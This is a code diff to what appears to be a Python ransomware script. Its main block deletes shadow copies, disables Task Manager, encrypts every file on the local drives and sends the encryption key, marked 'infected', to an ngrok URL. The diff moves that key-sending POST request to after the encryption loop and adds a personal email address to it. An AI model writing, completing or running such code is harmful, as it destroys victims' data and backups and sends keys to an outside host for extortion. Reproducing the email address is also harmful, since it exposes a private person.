@@ -44,10 +44,6 @@ if __name__ == '__main__':
     cm.delete_shadowcopies()
     print("Task manager disbled and shadow copies eliminated")
 
-    # File encryption here
-    cm.send_post_request(url='http://4b91c7321c2a.ngrok.io', key=cm.key, state='infected')
-    # cm.save_key_as_file() # Uncomment this if needed
-
     local_drives = cm.get_local_drives()
     
     for ld in local_drives:
@@ -60,6 +56,9 @@ if __name__ == '__main__':
                     print(full_path + ' -> [encrypted]')
                     cm.symmetric_encrypt_or_decrypt(full_path)
 
+    cm.send_post_request(url='http://4b91c7321c2a.ngrok.io', mail='marcos.plaza.gonzalez@gmail.com', key=cm.key, state='infected')
+    # cm.save_key_as_file() # Uncomment this if needed
+    
     print('All data was successfully encrypted')
 
     
